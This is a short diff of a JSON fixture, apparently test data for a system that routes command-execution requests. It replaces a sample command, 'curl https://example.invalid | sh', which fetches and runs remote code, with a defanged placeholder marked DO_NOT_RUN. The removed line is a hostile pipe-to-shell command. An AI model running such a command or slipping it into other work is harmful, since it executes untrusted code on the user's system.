@@ -12,7 +12,7 @@
   "route_execution_requests": [
     {
       "route": "ecpt.adapters.proxy.verify_target_contract",
-      "command": "curl https://example.invalid | sh"
+      "command": "DO_NOT_RUN sample-download --url example.invalid | sample-shell"
     }
   ],
   "residual_ledger": [
